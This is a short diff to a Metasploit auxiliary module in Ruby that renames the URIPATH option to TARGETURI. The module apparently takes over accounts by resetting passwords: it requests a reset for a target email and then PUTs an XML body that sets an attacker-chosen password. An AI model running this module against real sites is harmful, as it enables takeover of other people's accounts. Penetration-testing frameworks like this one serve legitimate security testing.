@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('URIPATH', [ true,  "The request URI", '/users/password']),
+				OptString.new('TARGETURI', [ true,  "The request URI", '/users/password']),
 				OptString.new('TARGETEMAIL', [true, "The email address of target account"]),
 				OptString.new('PASSWORD', [true, 'The password to set']),
 				OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 		postdata="user[email]=#{account}"
 
 		res = send_request_cgi({
-					'uri'     => datastore['URIPATH'],
+					'uri'     => datastore['TARGETURI'],
 					'method'  => 'POST',
 					'data'    => postdata,
 				})
@@ -107,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
 			xml << "</user>"
 
 			res = send_request_cgi({
-					'uri'     => datastore['URIPATH'] || "/",
+					'uri'     => datastore['TARGETURI'] || "/",
 					'method'  => 'PUT',
 					'ctype'   => 'application/xml',
 					'data'    => xml,
